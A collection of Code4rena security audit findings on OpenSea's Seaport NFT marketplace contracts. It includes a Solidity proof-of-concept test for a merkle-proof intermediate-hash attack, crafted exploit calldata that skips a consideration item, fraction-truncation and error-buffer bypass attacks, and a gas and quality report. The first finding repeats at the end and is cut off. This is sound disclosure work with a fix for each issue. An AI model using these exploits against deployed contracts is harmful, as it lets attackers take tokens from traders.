# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157   # Vulnerability details  ## Impact The protocol allows specifying several tokenIds to accept for a single offer. A merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item. The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.  There are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**. It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.  This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria. Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.  #### Example Alice wants to buy either NFT with tokenId 1 or tokenId 2. She creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`. She creates an offer for this criteria. An attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.  > One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard. >  > "While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'." [EIP721](https://eips.ethereum.org/EIPS/eip-721) > > Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions. > Therefore, ERC721-compliant token contracts are vulnerable to this attack.  #### POC Here's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in _Example_.  ```solidity contract BugMerkleTree is BaseOrderTest {     struct Context {         ConsiderationInterface consideration;         bytes32 tokenCriteria;         uint256 paymentAmount;         address zone;         bytes32 zoneHash;         uint256 salt;     }      function hashHashes(bytes32 hash1, bytes32 hash2)         internal         returns (bytes32)     {         // see MerkleProof.verify         bytes memory encoding;         if (hash1 <= hash2) {             encoding = abi.encodePacked(hash1, hash2);         } else {             encoding = abi.encodePacked(hash2, hash1);         }         return keccak256(encoding);     }      function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {         // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree         bytes32 leafLeft = bytes32(uint256(1));         bytes32 leafRight = bytes32(uint256(2));         bytes32 merkleRoot = hashHashes(leafLeft, leafRight);         console.logBytes32(merkleRoot);          Context memory context = Context(             consideration,             merkleRoot, /* tokenCriteria */             1e18, /* paymentAmount */             address(0), /* zone */             bytes32(0), /* zoneHash */             uint256(0) /* salt */         );         bytes32 conduitKey = bytes32(0);          token1.mint(address(alice), context.paymentAmount);         // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable         // we acquire the merkle root ID         test721_1.mint(address(this), uint256(merkleRoot));          _configureERC20OfferItem(             // start, end             context.paymentAmount, context.paymentAmount         );         _configureConsiderationItem(             ItemType.ERC721_WITH_CRITERIA,             address(test721_1),             // @audit set merkle root for NFTs we want to accept             uint256(context.tokenCriteria), /* identifierOrCriteria */             1,             1,             alice         );          OrderParameters memory orderParameters = OrderParameters(             address(alice),             context.zone,             offerItems,             considerationItems,             OrderType.FULL_OPEN,             block.timestamp,             block.timestamp + 1000,             context.zoneHash,             context.salt,             conduitKey,             considerationItems.length         );          OrderComponents memory orderComponents = getOrderComponents(             orderParameters,             context.consideration.getNonce(alice)         );         bytes32 orderHash = context.consideration.getOrderHash(orderComponents);         bytes memory signature = signOrder(             context.consideration,             alicePk,             orderHash         );          delete offerItems;         delete considerationItems;          /*************** ATTACK STARTS HERE ***************/         AdvancedOrder memory advancedOrder = AdvancedOrder(             orderParameters,             1, /* numerator */             1, /* denominator */             signature,             ""         );          // resolve the merkle root token ID itself         CriteriaResolver[] memory cr = new CriteriaResolver[](1);         bytes32[] memory proof = new bytes32[](0);         cr[0] = CriteriaResolver(               0, // uint256 orderIndex;               Side.CONSIDERATION, // Side side;               0, // uint256 index; (item)               uint256(merkleRoot), // uint256 identifier;               proof // bytes32[] criteriaProof;         );          uint256 profit = token1.balanceOf(address(this));         context.consideration.fulfillAdvancedOrder{             value: context.paymentAmount         }(advancedOrder, cr, bytes32(0));         profit = token1.balanceOf(address(this)) - profit;          // @audit could fulfill order without owning NFT 1 or 2         assertEq(profit, context.paymentAmount);     } } ```  ## Recommended Mitigation Steps Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a _leaf_ or not. An elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.) Then compute the leaf hash in the contract from the provided tokenId:  ```diff function _verifyProof(     uint256 leaf,     uint256 root,     bytes32[] memory proof ) internal pure {     bool isValid;  -    assembly { -        let computedHash := leaf +  bytes32 computedHash = keccak256(abi.encodePacked(leaf))   ... ```  There can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.  Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)   
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349   # Vulnerability details  When fulfilling a basic order we need to assert that the parameter `totalOriginalAdditionalRecipients` is less or equal than the length of `additionalRecipients` written in calldata. However in `_prepareBasicFulfillmentFromCalldata` this assertion is incorrect [(L346)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349): ```js         // Ensure supplied consideration array length is not less than original.         _assertConsiderationLengthIsNotLessThanOriginalConsiderationLength(             parameters.additionalRecipients.length + 1,             parameters.totalOriginalAdditionalRecipients         ); ``` The way the function it's written ([L75](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Assertions.sol#L75-L83)), it accepts also a length smaller than the original by 1 (basically there shouldn't be a `+ 1` in the first argument).  Interestingly enough, in the case `additionalRecipients.length < totalOriginalAdditionalRecipients`, the inline-assembly for-loop at [(L506)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L506) will read consideration items out-of-bounds. This can be a vector of exploits, as illustrated below.  ## Proof of Concept Alice makes the following offer: a basic order, with two `considerationItem`s. The second item has the following data: ```js consideration[1] = {  itemType: ...,  token: ...,  identifierOrCriteria: ...,  startAmount: X,  endAmount: X,  recipient: Y, } ``` The only quantities we need to track are the amounts `X` and recipient `Y`.  When fulfilling the order normally, the fulfiller will spend `X` tokens sending them to `Y`. It's possible however to exploit the previous bug in a way that the fulfiller won't need to make this transfer.  To do this, the fulfiller needs to craft the following calldata:  | calldata pointer |   correct calldata   |   exploit calldata  | |-----------------:|:--------------------:|:-------------------:| |              ... |          ...         |         ...         | |            0x204 |   1 (tot original)   |   1 (tot original)  | |            0x224 |  0x240 (head addRec) | 0x240 (head addRec) | |            0x244 |   0x2a0 (head sign)  |  0x260 (head sign)  | |            0x264 |   1 (length addRec)  |  0 (length addRec)  | |            0x284 |      X (amount)      |   X (length sign)   | |            0x2a4 |     Y (recipient)    |    Y (sign body)    | |            0x2c4 |  0x40 (length sign)  |   0x00 (sign body)  | |            0x2e4 | [correct Alice sign] |         ...         | |            0x304 | [correct Alice sign] |         ...         | |                  |                      |                     |  Basically writing `additionalRecipients = []` and making the signature length = `X`, with `Y` being the first 32 bytes. Of course this signature will be invalid; however it doesn't matter since the exploiter can call `validate` with the correct signature beforehand.  The transaction trace will look like this: - the assertion `_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength` passes; - the `orderHash` calculated is the correct one, since the for-loop over original consideration items picks up calldata at pointers {0x284, 0x2a4} [(L513)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L513-L550); - the order was already validated beforehand, so the signature isn't read; - at the end, during the tokens transfers, only `offer` and `consideration[0]` are transferred, since the code looks at `additionalRecipients` which is empty.  Conclusion:  Every Order that is "basic" and has two or more consideration items can be fulfilled in a way to not trade the _last_ consideration item in the list. The fulfiller spends less then normally, and a recipient doesn't get his due.  There's also an extra requirement which is stricter: this last item's `startAmount` (= endAmount) needs to be smallish (< 1e6). This is because this number becomes the signature bytes length, and we need to fill the calldata with extra zeroes to complete it. Realistically then the exploit will work only if the item is a ERC20 will low decimals.  I've made a hardhat test that exemplifies the exploit. [(Link to gist)](https://gist.github.com/0xsanson/e87e5fe26665c6cecaef2d9c4b0d53f4).  ## Recommended Mitigation Steps Remove the `+1` at L347.  
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238   # Vulnerability details  ## Impact  A partial order's fractions (`numerator` and `denominator`) can be reset to `0` due to a truncation. This can be used to craft malicious orders:  1. Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the `marketplaceContract`. 2. Alice places a `PARTIAL_OPEN` order with 10 ERC1155 tokens and consideration of ETH. 3. Malory tries to fill the order in the following way:     1. Malory tries to fill 50% of the order, but instead of providing the fraction `1 / 2`, Bob provides `2**118 / 2**119`. This sets the `totalFilled` to `2**118` and `totalSize` to `2**119`.     2. Malory tries to fill 10% of the order, by providing `1 / 10`. The computation `2**118 / 2**119 + 1 / 10` is done by "cross multiplying" the denominators, leading to the acutal fraction being `numerator = (2**118 * 10 + 2**119)` and `denominator = 2**119 * 10`.     3. Because of the `uint120` truncation in [OrderValidator.sol#L228-L248](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248), the `numerator` and `denominator` are truncated to `0` and `0` respectively.     4. Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!   ## Proof of Concept   For a full POC: https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409  The following change would make the above POC fail: ```diff modified   contracts/lib/OrderValidator.sol @@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {                  // Update order status and fill amount, packing struct values.                  _orderStatus[orderHash].isValidated = true;                  _orderStatus[orderHash].isCancelled = false; +                require(filledNumerator + numerator <= type(uint120).max, "overflow"); +                require(denominator <= type(uint120).max, "overflow");                  _orderStatus[orderHash].numerator = uint120(                      filledNumerator + numerator                  ); @@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {              // Update order status and fill amount, packing struct values.              _orderStatus[orderHash].isValidated = true;              _orderStatus[orderHash].isCancelled = false; +            require(numerator <= type(uint120).max, "overflow"); +            require(denominator <= type(uint120).max, "overflow");              _orderStatus[orderHash].numerator = uint120(numerator);              _orderStatus[orderHash].denominator = uint120(denominator);          } ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps  A basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and require more changes to fully fix it. See a related issue: "A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone" that points out a related but a more fundamental issue with the mechanism.   
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L406   # Vulnerability details  ## Impact   The `_aggregateValidFulfillmentOfferItems()` function aims to revert on orders with zero value or where a total consideration amount overflows. Internally this is accomplished by having a temporary variable `errorBuffer`, accumulating issues found, and only reverting once all the items are processed in case there was a problem found. This code is optimistic for valid inputs.  Note: there is a similar issue in `_aggregateValidFulfillmentConsiderationItems()` , which is reported separately.  The problem lies in how this `errorBuffer` is updated: ```solidity                 // Update error buffer (1 = zero amount, 2 = overflow).                 errorBuffer := or(                   errorBuffer,                   or(                     shl(1, lt(newAmount, amount)),                     iszero(mload(amountPtr))                   )                 ) ```  The final error handling code: ```solidity             // Determine if an error code is contained in the error buffer.             switch errorBuffer             case 1 {                 // Store the MissingItemAmount error signature.                 mstore(0, MissingItemAmount_error_signature)                  // Return, supplying MissingItemAmount signature.                 revert(0, MissingItemAmount_error_len)             }             case 2 {                 // If the sum overflowed, panic.                 throwOverflow()             } ```  While the expected value is `0` (success),  `1` or `2` (failure), it is possible to set it to `3`, which is unhandled and considered as a "success". This can be easily accomplished by having both an overflowing item and a zero item in the order list.  This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.  ## Proof of Concept  Craft an offer containing two errors (e.g. with  zero amount and overflow). Call `matchOrders()`. Via calls to `_matchAdvancedOrders()`, `_fulfillAdvancedOrders()`, `_applyFulfillment()`, `_aggregateValidFulfillmentOfferItems()` will be called. The `errorBuffer` will get a value of 3  (the `or` of 1 and 2). As the value of 3 is not detected, no error will be thrown and the order will be executed, including the mal formed values.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  1. Change the check on [FulfillmentApplier.sol#L465](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L465)  to consider `case 3`. 2. Potential option: Introduce an early abort in case `errorBuffer != 0` on [FulfillmentApplier.sol#L338](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L338)  
# Quality Report  Repo commit referenced: [`49799ce156d979132c9924a739ae45a38b39ecdd`](https://github.com/ProjectOpenSea/seaport/tree/49799ce156d979132c9924a739ae45a38b39ecdd)  ## BasicOrderFulfiller.sol  ### 1. Adding a new variable to the assembly  For lines [82-86](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L82-L86), we can define a new YUL variable, `basicOrderType` to remove the need to call `calldataload` twice and also adding the `BasicOrder_basicOrderType_cdPtr` twice to the stack, the modified code block  would look like this:  ```solidity let basicOrderType := calldataload(BasicOrder_basicOrderType_cdPtr)  // Mask all but 2 least-significant bits to derive the order type. orderType := and(basicOrderType, 3)  // Divide basicOrderType by four to derive the route. route := div(basicOrderType, 4) ```  This would make the code more readable and also should require less gas.  ### 2. Missing parameter NatSpec info  Function `_transferERC20AndFinalize` is missing a NatSpec info for `accumulator`. Need to add:  ```solidity * @param accumulator An open-ended array that collects transfers to execute *                    against a given conduit in a single call. ```  ## ConsiderationStructs.sol  Typo in `SpentItem` NatSpec comment `d` is missing from `and` (Line [`68`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/ConsiderationStructs.sol#L68)):  ```diff - * @dev A spent item is translated from a utilized offer item an has four +  * @dev A spent item is translated from a utilized offer item and has four ```  ## CriteriaResolution.sol  ### 1. Modify For loops to save gas  On line [`56`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L56) and [`166`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L166) the for loops can be modified to:  ```solidity uint256 i = 0;  // Iterate over each criteria resolver. for (; i < totalCriteriaResolvers;) {     ...     ++i; }  i = 0;  // Iterate over each advanced order. for (; i < totalAdvancedOrders;) {     ...     ++i; } ```  Note. We don't need to use `unchecked` for `++i` since both for loop blocks are child nodes of a bigger `unchecked` block.  The same modification can be made for the for loops with the `j` counter on line [`184`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L185) and [`199`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L199).  ### 2. Redundant array element lookup One line `177`, the ith element of `advancedOrders` is lookup even though that element is already have been saved in memory as `advancedOrder`  Current (lines [`168-178`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L168-178)):  ```solidity AdvancedOrder memory advancedOrder = advancedOrders[i];  // Skip criteria resolution for order if not fulfilled. if (advancedOrder.numerator == 0) {     continue; }  // Retrieve the parameters for the order. OrderParameters memory orderParameters = (     advancedOrders[i].parameters ); ```  So we can reuse `advancedOrder` and the modified block would be:  ```solidity AdvancedOrder memory advancedOrder = advancedOrders[i];  // Skip criteria resolution for order if not fulfilled. if (advancedOrder.numerator == 0) {     continue; }  // Retrieve the parameters for the order. OrderParameters memory orderParameters = (     advancedOrder.parameters ); ```  ie: ```diff - advancedOrders[i].parameters + advancedOrder.parameters ```  ## Executor.sol  Using the `AccumulatorArmed` defined constants from `ConsiderationConstants.sol`, we can rewrite [Executor.sol:L433](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/Executor.sol#L433):  ```diff // file: contracts/lib/Executor.sol:L433  - if (accumulator.length != 64) { + if (accumulator.length != AccumulatorArmed) { ```  ## FulfillmentApplier.sol  ### 1. Typo in comment  The `if` block on lines [`180-183`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/FulfillmentApplier.sol#L180-L183) has typos for the comment before the `if` block:  ```solidity // Set the offerer as the receipient if execution amount is nonzero. if (execution.item.amount == 0) {     execution.item.recipient = payable(execution.offerer); } ```  `nonzero` needs to be changed to `zero` and `receipient` to `recipient`  ```diff - // Set the offerer as the receipient if execution amount is nonzero. + // Set the offerer as the recipient if execution amount is zero. ```  ## GettersAndDerivers.sol  ### 1. Typo Typo in comment on line [`131`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L131), `offer items` should be `consideration items`:  ```diff - // Iterate over the offer items (not including tips). + // Iterate over the consideration items (not including tips). ```  ### 2. Unpredictable Memory Location  On line [`170`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L170) a memory location has been set with an unpredictable address/content:  ```solidity let typeHashPtr := sub(orderParameters, OneWord) ```   ## OrderCombiner.sol  For the function `_validateOrdersAndPrepareToFulfill` is the `maximumFulfilled` has been reached, the loop keeps continuing without essentailly doing anything other than wasting gas, since on line `196` it keeps jumping to the next `i` value. The `continue` statement on line `196` should be replaced by the `break` statement to exit the loop. ([Ref](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L181-L197))  ```diff for (uint256 i = 0; i < totalOrders; ++i) {     // Retrieve the current order.     AdvancedOrder memory advancedOrder = advancedOrders[i];      // Determine if max number orders have already been fulfilled.     if (maximumFulfilled == 0) {         // Mark fill fraction as zero as the order will not be used.         advancedOrder.numerator = 0;          // Update the length of the orderHashes array.         assembly {             mstore(orderHashes, add(i, 1))         }          // Continue iterating through the remaining orders. -        continue; +        break;     } ```  ## OrderFulfiller.sol  To optimize the for loop in Lines [468-475](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L468-L475)  The code block below:   ```solidity // Skip overflow check as the index for the loop starts at zero. unchecked {     // Iterate over the given orders.     for (uint256 i = 0; i < totalOrders; ++i) {         // Convert to partial order (1/1 or full fill) and update array.         advancedOrders[i] = _convertOrderToAdvanced(orders[i]);     } } ```  can be changed too:  ```solidity // Skip overflow check as the index for the loop starts at zero. unchecked {     // Iterate over the given orders.     uint256 i = 0;     for (; i < totalOrders;) {         // Convert to partial order (1/1 or full fill) and update array.         advancedOrders[i] = _convertOrderToAdvanced(orders[i]);          ++i;     } } ```  ## TokenTransferrer.sol  In the function  `_performERC1155BatchTransfers(ConduitBatch1155Transfer[] calldata batchTransfers)` on line `542` the `data` length offset value is incorrect.  ```solidity // Set the length of the data array in memory to zero. mstore(     add(         BatchTransfer1155Params_data_length_basePtr,         idsAndAmountsSize     ),     0 ) ```  This value is used to call a `safeBatchTransferFrom(address from, address to, uint256[] ids, uint256[] amounts, bytes data)` endpoint on a `ERC1155` contract.  The formula for the offset should be:  $$   \text{data\_length\_offset} = \mathtt{0x20} + \mathtt{0x04} + \mathtt{0xa0} + \text{idsAndAmountsSize}  \\ = \mathtt{0xc4} + \text{idsAndAmountsSize}  $$  Currently the offset is $\mathtt{0x104} + \text{idsAndAmountsSize}$ which expands memory 2 words extra more than the necessary amount.  Here is an example (cast from foundry):  ``` >> cast abi-encode "safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)" 0x8496a8EDc4A0894123062194015c0Cf86b7A277c 0x8496a8EDc4A0894123062194015c0Cf86b7A277c [] [] 0x  0x00 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c from 0x20 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c to 0x40 00000000000000000000000000000000000000000000000000000000000000a0 head(ids) 0x60 00000000000000000000000000000000000000000000000000000000000000c0 head(amounts) 0x80 00000000000000000000000000000000000000000000000000000000000000e0 head(data) 0xa0 0000000000000000000000000000000000000000000000000000000000000000 ids_length 0xc0 0000000000000000000000000000000000000000000000000000000000000000 amounts_length 0xe0 0000000000000000000000000000000000000000000000000000000000000000 data_length ```  The above ABI encoding does not include the `ZeroSlot` in the memory and also the function signature after adding those according to the instruction in `_performERC1155BatchTransfers` we would get:  ``` 0x000 0000000000000000000000000000000000000000000000000000000000000000 ZeroSlot 0x004 2eb2c2d6 0x024 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c from 0x044 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c to 0x064 00000000000000000000000000000000000000000000000000000000000000a0 head(ids) 0x084 00000000000000000000000000000000000000000000000000000000000000c0 head(amounts) 0x0a4 00000000000000000000000000000000000000000000000000000000000000e0 head(data) 0x0c4 0000000000000000000000000000000000000000000000000000000000000000 ids_length 0x0e4 0000000000000000000000000000000000000000000000000000000000000000 amounts_length 0x104 0000000000000000000000000000000000000000000000000000000000000000 data_length ```  In this example we have `idsAndAmountsSize` = `0x40` = `TwoWords` and the constant `BatchTransfer1155Params_data_length_basePtr` = `0x104` (based on TokenTransferrerConstants.sol), so according to the line `TokenTransferrer.sol:542` the `data_length` memory offset would need to be `0x144` which is outside of the neccesssary memory area.  To fix this error, these changes need to be applied:  Block before change:  ```solidity // file: contract/lib/TokenTransferrer:L541  // Set the length of the data array in memory to zero. mstore(     add(         BatchTransfer1155Params_data_length_basePtr,         idsAndAmountsSize     ),     0 )  // Determine the total calldata size for the call to transfer. let transferDataSize := add(     BatchTransfer1155Params_data_length_basePtr,     mul(idsLength, TwoWords) ) ```  Block after change:  ```solidity // file: contract/lib/TokenTransferrer:L541  // Determine the total calldata size for the call to transfer. let transferDataSize := add(     BatchTransfer1155Params_data_length_basePtr,     idsAndAmountsSize )  // Set the length of the data array in memory to zero. mstore(     transferDataSize,     0 ) ```  and also the following constant would need to be updated:  ```diff // file: contract/lib/TokenTransferrerConstants.sol:L146  - uint256 constant BatchTransfer1155Params_data_length_basePtr = 0x104; + uint256 constant BatchTransfer1155Params_data_length_basePtr = 0xc4; ```  The change above removes uses less arithmetic operation which in turn would also save some gas.  ## ZoneInteractions.sol  For the function `_assertRestrictedAdvancedOrderValidity` on lines [104-113](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/ZoneInteraction.sol#L104-L113), `offerer` and `zone` are passed as two extra inputs although `advancedOrder` contains those 2 parameters.  ```solidity function _assertRestrictedAdvancedOrderValidity(     AdvancedOrder memory advancedOrder,     CriteriaResolver[] memory criteriaResolvers,     bytes32[] memory priorOrderHashes,     bytes32 orderHash,     bytes32 zoneHash,     OrderType orderType,     address offerer,     address zone ) internal view { ```  These parameters can be accessed as:  ```solidity advancedOrder.parameters.offerer advancedOrder.parameters.zone ```  This brings up the question if the extra inputs were provided like that to save gas, since using `advancedOrder.parameters.VARIABLE` would require the compiler to use extra instruction to calculate the memory offset and also load those variables to memory. This extra work was perhaps done in a function calling `_assertRestrictedAdvancedOrderValidity`.  ## ZoneInteractionErrors.sol  There is typo on line [`13`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/interfaces/ZoneInteractionErrors.sol#L13) in the NatSpec comment:  `offerrer` replaced by `offerer` ```diff - either the offerrer or the order's zone or approved as valid by the + either the offerer or the order's zone or approved as valid by the ```  ## For loops The for loops in these FILES:LINES   - [Conduit.sol:66](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/conduit/Conduit.sol#L66) - [Conduit.sol:130](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/conduit/Conduit.sol#L130) - [BasicFulfiller.sol:948](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L948) - [BasicFulFiller.sol:1040](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L1040) - [CriteriaResolution.sol:56](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L56) - [CriteriaResolution.sol:166](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L166) - [CriteriaResolution.sol:184](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L184) - [CriteriaResolution.sol:199](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L199) - [OrderCombiner.sol:181](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L181) - [OrderCombiner.sol:247](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L247) - [OrderCombiner.sol:291](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L291) - [OrderCombiner.sol:373](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L373) - [OrderCombiner.sol:473](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L473) - [OrderCombiner.sol:498](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L498) - [OrderCombiner.sol:577](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L577) - [OrderCombiner.sol:598](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L598) - [OrderCombiner.sol:621](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L621) - [OrderCombiner.sol:754](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L754) - [OrderFulfiller.sol:217](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L217) - [OrderFulfiller.sol:306](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L306) - [OrderFulfiller.sol:471](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L471) - [OrderValidator.sol:272](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderValidator.sol#L272) - [OrderValidator.sol:350](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderValidator.sol#L350)  can be changed.  General structure used: ```solidity for (uint256 i = 0; CONDITION; ++i) { ... } ```  Change to: ```solidity uint256 i = 0;  for (; CONDITION;) {      ...     unchecked {          ++i;     }  } ```  The `unchecked` inner block might not be necessary since some of the loops are inside a bigger `unchecked` block.  and for the assembly blocks in FILES:LINES:  - [BasicOrderFulfiller.sol:506](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L506) - [BasicOrderFulfiller.sol:615](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L615) - [CriteriaResolution.sol:256](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L256) - [GettersAndDerivers.sol:78](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L78) - [GettersAndDerivers.sol:133](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L133)  General structure used: ```solidity for { initial }{ condition }{ increment } { ... } ```  Change to ```solidity initial  for {}{ condition }{} {      ...      increment } ```
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157   # Vulnerability details  ## Impact The protocol allows specifying several tokenIds to accept for a single offer. A merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item. The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.  There are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**. It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.  This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria. Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.  #### Example Alice wants to buy either NFT with tokenId 1 or tokenId 2. She creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`. She creates an offer 